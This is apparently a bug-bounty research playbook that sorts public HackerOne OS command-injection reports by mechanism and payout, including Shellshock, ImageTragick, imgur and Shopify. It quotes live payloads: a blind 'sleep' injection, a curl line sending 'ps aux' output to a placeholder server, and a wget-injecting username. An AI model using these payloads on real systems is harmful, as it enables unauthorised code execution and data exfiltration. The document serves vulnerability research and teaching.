---
title: "OS Command Injection — shell metacharacters, argument injection, protocol injection, and the blind-timing oracle"
type: playbook
category: os-command-injection
cwe: "CWE-78"
source_count: 17
full_bodies_available: 16
corpus: "h1.security.nathan.sx roster (150 rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-11-04"
note: "Anchor bodies: RCE-73567 (Shopify, $3,000 list), RCE-212696 (imgur, $5,000 list), RCE-143966 (ImageTragick, $7,500 list), RCE-29839 (Shellshock $20,000 list). Claims trace to bodies read 2026-11-04."
---

# OS Command Injection — own the shell, not the code

## 1. Overview

Command injection is the execution primitive the corpus pays most reliably: seventeen rows,
**$51,862/14 paid** (json $812/2 · list $51,050/12).
The lane's lesson stack is stable across all of it: (1) the injection point is an
*argument* position inside an OS command the app must run; (2) metacharacter filtering and
space-stripping decide how far you get; (3) when output is not returned (blind), the
platform tells you through timing and out-of-band callbacks; (4) the strongest 2015-2017
era proofs sent command output to the hunter's own server. The guide rows in the
bibliography (§1 of blogs-index — zseano's BBH page and HackerOne's Jobert post) write the
same doctrine one era earlier: a timing baseline first, repeat the injection to kill false
positives, stick to `sleep`, `id`, `hostname`, `whoami`.

**Case-stock (17 rows / $51,862):**

| Case | Target | Mechanism | Bounty |
|---|---|---|---|
| [RCE-29839](https://hackerone.com/reports/29839) | GNU Bash (VDP) | Shellshock env-var function definition | $20,000 (list) |
| [RCE-143966](https://hackerone.com/reports/143966) | ImageMagick (VDP) | Coded decoders → shell metacharacters ("ImageTragick") | $7,500 (list) |
| [RCE-212696](https://hackerone.com/reports/212696) | imgur | `gm convert` argument injection via unescaped space | $5,000 (list) |
| [RCE-73567](https://hackerone.com/reports/73567) | Shopify | textarea → blind `$()` execution | $3,000 (list) |
| [RCE-139398](https://hackerone.com/reports/139398) | AirOS | redirect injection (family row 3) | $2,750 (list) |
| [RCE-121940](https://hackerone.com/reports/121940) | Ubiquiti | `dl-fw.cgi` `fw_url` → wget shell injection | $1,300 (list) |
| [RCE-128750](https://hackerone.com/reports/128750) | AirOS | server-response regex injection → speed-test exec | $1,500 (list) |
| [RCE-119317](https://hackerone.com/reports/119317) | AirOS | read-only user reaches shell commands | $1,500 (list) |
| [RCE-104465](https://hackerone.com/reports/104465) | git-fastclone | `ext://` URL → command exec | $2,000 (list) |
| [RCE-105190](https://hackerone.com/reports/105190) | git-fastclone | Cocaine interpolation injection | $2,000 (list) |
| [RCE-137631](https://hackerone.com/reports/137631) | Ruby (VDP) | `Net::SMTP` RCPT TO header injection | - |
| [RCE-135072](https://hackerone.com/reports/135072) | Uber | profile pic → ImageMagick MVG exec (pre-disclosure) | $2,500 (list) |
| [RCE-59663](https://hackerone.com/reports/59663) | concrete5 | sender email → sendmail injection | - |
| [RCE-214022](https://hackerone.com/reports/214022) | Discourse | admin username → backticks in gzip | $512 (json) |
| [RCE-29480](https://hackerone.com/reports/29480) | IRCCloud | IRC channel name → server-side IRC command | $300 (json) |
| [RCE-250587](https://hackerone.com/reports/250587) | ExpressionEngine | `exec()` + user-controlled filename (pattern PoC) | - |
| [RCE-197958](https://hackerone.com/reports/197958) | EdgeSwitch | Web GUI root command injection (metadata-only) | $2,000 (list) |

## 2. The timing oracle era: blind proof discipline

RCE-73567 is the corpus's cleanest blind-RCE proof — a single payload, an observable delay,
then a server-log callback:

> Open
>
> In the text area enter **$(`sleep 20`)** and hit "Update List"
>
> The result should come out at around 20 seconds, there-by executing sleep command

> I've attached a video for this RCE bug, in which I had executed **id** command for
> verification purpose on the server and sent back the result to my Apache logs, as the
> RCE here is blind.

That is the whole playbook: payload ($(`sleep 20`)) → observable consequence (~20 s) →
identity proof (`id` exfiltrated to the hunter's Apache access log). The same shape prices
out at **$3,000 (list)**. Jobert's July 2017 guide (blogs-index §1b) writes the identical
method — baseline, inject `&& sleep 5`, "it jumped from ~3 seconds to ~8 seconds, which is
an increase of exactly 5 seconds", then repeat "to make sure it's not a false positive".
zseano's BBH page compresses it to the hunting cadence: "Add a sleep command injection to
every parameter & monitor the response time for each. Delayed response? Time to investigate
for a potential vulnerability!"

Modern echo: the timing-first pattern is still the first move because it needs no outbound
connectivity (P4).

## 3. Argument injection: escape the space, not the metacharacters

RCE-212696 (imgur, **$5,000 (list)**, critical) is the definitive argument-injection story
— the filter took metacharacters, the space survived:

> The vulnerability exists because the user input (the contents of `y` GET parameter) goes
> into a shell command. While all special characters (like `|`, `$` and so on) seem to be
> escaped, the space character is not. This allows the attacker to insert additinal command
> line arguments. The common reason for such behaviour is `escapeshellcmd` PHP function

And the weaponization — GraphicsMagick's `-write` accepting a pipe-target "filename":

> Change the `y` parameter of the request so it becomes `0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-`

> The command (`ps aux|curl http://<your-server> -d @-`) will be executed somewhere inside
> imgur, and you will get a HTTP request to `<your-server>` with the result of `ps aux` in
> the POST body. You can replace `ps aux` with another command (but you have to write
> `${IFS}` instead of spaces).

(sic) "additinal" in the original. The `${IFS}` substitution is the space-filter bypass
that converts "metacharacters escaped" into "arguments injected". Note what the report does
*not* need: no reverse shell, no payload framework — one GET parameter, one callback.

## 4. Second-order injection: the username that shells the server

RCE-214022 (Discourse, **$512 (json)**, high) chains an admin-only write primitive into
command injection at a different code path:

> Although the application prevents special characters in usernames, an admin is able to
> make modifications to the database via the restore from backup feature. This allows an
> admin to escalate to command injection.

> `gzip -5 #{absolute_path}`

> 10. ---> You forced the server to make a wget leading to RCE/command injection.

The payload was `test.txt;wget mrzioto.com` as a username. Two lessons: (1) sanitization
must cover *every* writer to the field — the admin path defeated the normal-path filter;
(2) the sink was backticks inside a Ruby `ExportCsvFile` job — a class boundary (app code
invoking the shell) that survives an ORM/PDF/image pipeline. This is "second-order" in the
era vocabulary: the injection happens at restore-time write, the weapon fires later at
export-time shell.

## 5. The tool-and-protocol lanes

**Device management consoles.** The Ubiquiti/AirOS family is the largest single-vendor
cluster (121940, 128750, 119317, 139398). RCE-121940 is the NCC Group advisory, quoted
specially because it names the *sink shape* — a URL parameter walked directly into a shell
string:

> The dl-fw.cgi script does not properly sanitize URLs passed via the fw_url parameter,
> allowing arbitrary shell commands to be provided as part of the input.

Line 62-63 of the body shows the sink: `$cmd = "$cmd_wget -O $firmware_file --header='Referer: $eula_ur…` —
the classic "user text inside a double-quoted shell string" bug. RCE-128750 is the same
device through *server-controlled* data injection: the speed-test peer's `Set-Cookie`
header lands in `$session_key` via `parseHeaders`, and `doLogin` concatenates it into a
shell command (body: `$cmd = $cmd_trigger + $session_str`). RCE-119317's auth nuance: a **read-only** user reaching shell
commands still counts — the privilege of the console is not the privilege of the shell.

**Git transport.** RCE-104465 (`ext://` URLs → arbitrary command execution) and RCE-
105190 (Cocaine-framework interpolation) both sit in git-fastclone; the git URL grammar is
a command dispatcher — anything after `ext::` executes.

**Mail/protocol grammar.** RCE-137631 is Ruby's `Net::SMTP` RCPT TO injection (upstream
disclosure) and RCE-29480 is IRCCloud's channel name parsed as an IRC protocol command
(**$300 (json)**):

> IRCCloud does not validate the channel names created by a user causing it to be parsed
> as an IRC command such as QUIT.

> Here is my PoC of a malicious channel name:
> ``#treehouse'){%0a%0dQUIT``

Protocol injection is command injection where the "command" is the remote protocol's —
the damage is session/channel control rather than a shell, and the payout shows it ($300
vs $5,000+). The weakness tag on this row (`CSRF`) is a mislabel — body read decided the
class.

## 6. Environment & decoder injection: Shellshock and ImageTragick

The row that is the disclosure itself — RCE-29839 on the **GNU Bash VDP**, at **$20,000
(list)** the largest single figure in module 01:

> GNU Bash versions 1.14 through 4.3 contain a flaw that processes commands placed after
> function definitions in the added environment variable, allowing remote attackers to
> execute arbitrary code via a crafted environment which enables network-based exploitation.

**ImageTragick** pairs an upstream row (RCE-143966, **$7,500 (list)**) with an in-program
row (RCE-135072, Uber profile pictures, pre-disclosure). RCE-143966 quotes the CVE text:

> The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT, (6) SHOW, (7) WIN, and (8) PLT
> coders in ImageMagick before 6.9.3-10 and 7.x before 7.0.1-1 allow remote attackers to
> execute arbitrary code via shell metacharacters in a crafted image, aka "ImageTragick."

The corpus shard note: the mirror has **zero** ImageTragick-title rows (source-index §1);
these two entered via the rce-core and code-exec arms. The class lesson is the *delivery
pair*: a file-format feature (MVG coders) that composes shell strings, plus an upload
endpoint that feeds it. Same shape repeatedly re-paid in later eras (P4: ImageMagick
policy.xml hardening exists now — the fingerprint changed, the shape did not).

## 7. What pays, what doesn't

- The corpus pays the **shell**, not the claim: RCE-197958 (EdgeSwitch, root, medium) —
  metadata-only body yet **$2,000 (list)** — and the Ubiquiti/AirOS device family paid
  $1,300-$2,750 each; device consoles were a paying sub-lane.
- **$0 rows** are the loud negative examples: RCE-250587 (pattern-level PoC, "potentially
  unsanitized" filename — no live exploit) and the informative/noise completions in module
  08. Escapeshellarg-vs-escapeshellcmd discussions in bodies read as theory without a hit.
- **Read-only-user rows paid**: RCE-119317 (AirOS read-only user) resolved at **$1,500
  (list)** — a read-only console user reaching shell commands still monetized; the family
  ran $1,300–$2,750 each. The same bug in a SaaS admin lane today maps to P4
  "reached with credentials" logic.
- The biggest module figures went to **Injector-as-disclosure** rows (Bash $20,000)
  and **argument injection into privileged pipelines** (imgur $5,000) — the flaw's value
  was in what it reached, not in a novel trigger.

## 8. Cross-references

- Module 07 holds the rows where another class *supplies* the RCE (upload/XXE/SQLi/tcpip
  originators) — RCE-135072's Uber row stays here because the flaw (shell-composition in
  the coder) is command-injection class even though delivery needs an image upload.
- Discourse's `gzip -5` sink pairs with the Rails secret-cookie cases in module 03 (the
  same "app code composes a dangerous string" shape, deser flavor).
- The blind-proof ladder (`sleep` → `id` → callback → log) is written in full in
  blogs-index §1b; module 01's corpus rows execute it end-to-end.
